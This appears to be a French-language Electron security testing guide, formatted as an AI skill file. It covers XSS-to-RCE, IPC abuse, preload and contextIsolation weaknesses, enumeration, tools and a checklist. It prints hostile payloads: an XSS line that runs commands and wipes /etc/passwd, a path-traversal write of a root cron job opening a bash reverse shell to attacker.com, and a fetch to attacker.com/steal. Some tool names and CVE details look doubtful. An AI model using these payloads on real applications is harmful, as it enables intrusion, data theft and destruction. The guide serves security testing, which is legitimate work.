---
name: electron-security
description: Guide complet de sécurité Electron — XSS to RCE, IPC abuse, contextIsolation bypass, preload script vulns, CSP bypass, sandbox escape, outils
---

# Electron Security — Guide d'Exploitation Avancé

## Références principales
- **HackTricks Electron** : https://hacktricks.wiki/en/generic-methodologies-and-resources/electron-security/
- **Electronge** (ElectroNG) : https://github.com/attackercan/electronegativity
- **PortSwigger Research** : https://portswigger.net/research/hacking-electron
- **Electron Security Docs** : https://www.electronjs.org/docs/latest/tutorial/security

---

## 1. Architecture Electron

```
┌──────────────────────────────────────┐
│           Main Process              │
│  (Node.js full access)              │
│  - IPC handler                      │
│  - File system                      │
│  - Shell execution                  │
└──────────┬───────────────────────────┘
           │ IPC (send/on/invoke)       │
┌──────────┴───────────────────────────┐
│         Renderer Process             │
│  (Chromium sandbox)                  │
│  - web page / UI                     │
│  - contextIsolation / nodeIntegration│
└──────────────────────────────────────┘
```

---

## 2. Vecteurs d'attaque principaux

### 2.1 XSS dans le Renderer → RCE (si nodeIntegration: true)

```javascript
// main.js — TRÈS VULNÉRABLE
new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,    // Node.js dans le renderer
    contextIsolation: false   // Pas d'isolation
  }
})
```

**Exploitation** : XSS dans le renderer → accès complet à Node.js

```html
<!-- page vulnérable -->
<img src=x onerror="
  require('child_process').execSync('calc.exe');
  require('fs').writeFileSync('/etc/passwd', '');
">
```

### 2.2 ContextIsolation Bypass

Même avec `contextIsolation: true`, si le preload script expose des APIs dangereuses :

```javascript
// preload.js — VULNÉRABLE
contextBridge.exposeInMainWorld('api', {
  execute: (cmd) => ipcRenderer.invoke('run-command', cmd),
  readFile: (path) => ipcRenderer.invoke('read', path),
  setTitle: (title) => ipcRenderer.send('set-title', title)
})
```

Si le main process écoute ces canaux sans validation :

```javascript
// main.js
ipcMain.handle('run-command', (event, cmd) => {
  exec(cmd); // 🔴 RCE
})
```

### 2.3 Preload Script Vulnérabilités

```javascript
// preload.js — prototype pollution
contextBridge.exposeInMainWorld('config', {
  getPreference: (key) => ipcRenderer.sendSync('get-pref', key)
})

// Si le renderer peut polluer Object.prototype :
// {__proto__: {key: "something"}}
```

### 2.4 Navigation à Origine Arbitraire

```javascript
// main.js — VULNÉRABLE
new BrowserWindow({
  webPreferences: {
    nativeWindowOpen: true   // Permet window.open() de naviguer hors origine
  }
})
```

Si un XSS dans la page peut `window.open('file:///etc/passwd')`.

### 2.5 Shell.openExternal

```javascript
// main.js — VULNÉRABLE
ipcMain.handle('open-external', (event, url) => {
  shell.openExternal(url)  // Protocole arbitraire
})
```

**Exploitation** :
```javascript
// Dans le renderer (XSS ou bridge)
api.openExternal('file:///C:/Users/Admin/AppData/Roaming/something')
api.openExternal('javascript:fetch("http://attacker.com/steal")') // Certaines versions
```

---

## 3. Énumération Electron

### 3.1 Identifier une app Electron

```bash
# Sur Linux
ps aux | grep electron
ls -la /opt/ | grep -i electron

# Sur Windows
tasklist | findstr electron
# Dossier %AppData%/../Local/ ou Program Files/

# Inspecter les ressources
# Windows: resources/app.asar
# Linux: /opt/<app>/resources/
# macOS: <App>.app/Contents/Resources/app.asar
```

### 3.2 Extraction des sources ASAR

```bash
# Installer asar
npm install -g @electron/asar

# Extraire le bundle
asar extract app.asar app_source/
ls -la app_source/

# Inspecter main.js et preload.js
cat app_source/main.js
cat app_source/preload.js
```

### 3.3 Activer DevTools à distance

```bash
# Si l'app a --remote-debugging-port
# Lancer l'app avec : --remote-debugging-port=9222
# Puis ouvrir : chrome://inspect dans Chrome

# Forcer le debugging si on a accès aux fichiers de config
# Modifier package.json ou les settings
```

---

## 4. Payloads d'exploitation

### 4.1 RCE via IPC Injection

```javascript
// Si un channel IPC accepte des paths
ipcRenderer.invoke('save-file', {
  path: '/tmp/../../../etc/cron.d/revshell', // Path traversal
  content: '*/1 * * * * root bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"\n'
})
```

### 4.2 RCE via Protocol Handler

```javascript
// registerFileProtocol ou registerHttpProtocol
protocol.registerFileProtocol('myapp', (request, callback) => {
  callback({path: request.url.replace('myapp://', '')})  // Path traversal
})
// URL: myapp://../../etc/passwd → /etc/passwd
```

### 4.3 Sandbox Escape via Chromium vuln

```bash
# CVE-2023-30798, CVE-2023-2723, etc.
# Combiner XSS renderer + V8 exploit → sandbox escape
# → RCE dans le main process
```

### 4.4 CSP Bypass via Electron-specific

```javascript
// Si le CSP est défini dans HTTP headers mais pas dans webPreferences
// Le renderer peut utiliser file: ou custom protocols
<iframe src="file:///etc/passwd">
```

---

## 5. Outils

```bash
# Electronegativity — Static analysis for Electron
npm install -g @doyensec/electronegativity
eg check /path/to/electron/app

# electron-fiddle — Test rapide de configurations
# https://www.electronjs.org/fiddle

# Burp Suite — Interception du trafic
# Configurer proxy dans app.setProxy()

# ASAR extract
asar list app.asar
asar extract app.asar dest/
```

### Analyse de sécurité

```bash
# Lancer electronegativity sur les sources
eg check /opt/target-app/resources/app.asar \
  --output results.json \
  --severity critical,high,medium

# Vérifications manuelles
grep -r "nodeIntegration" main.js
grep -r "contextIsolation" main.js
grep -r "ipcMain" main.js
grep -r "contextBridge" preload.js
grep -r "shell.openExternal" main.js
grep -r "protocol.register" main.js
```

---

## 6. Checklist

```
CONFIGURATION
☐ nodeIntegration: true ? → XSS to RCE
☐ contextIsolation: false ? → prototype pollution & bypass
☐ sandbox: false ? → sandbox escape possible
☐ nativeWindowOpen: true ? → navigation to file://
☐ webviewTag: true ? → webview exploitation
☐ allowRunningInsecureContent: true ? → mixed content

PRELOAD
☐ contextBridge.exposeInMainWorld → quoi d'exposé ?
☐ ipcRenderer.send/invoke → quels canaux ?
☐ ipcRenderer.on → écoute des messages main → renderer ?
☐ Validation des messages IPC côté main ?

MAIN PROCESS
☐ ipcMain.handle(/on) → validation des arguments ?
☐ shell.openExternal / openPath → URLs non validées ?
☐ exec/spawn dans les handlers IPC ?
☐ protocol.registerFileProtocol → path traversal ?
☐ Menu items / shortcuts → RCE via eval ?

EXPLOITATION
☐ XSS dans le renderer → quel impact ?
☐ RCE via IPC abuse ?
☐ Path traversal via file protocol ?
☐ Vol de tokens / cookies / localStorage ?
☐ Élévation de privilèges système ?
☐ Persistance via auto-updater ?
```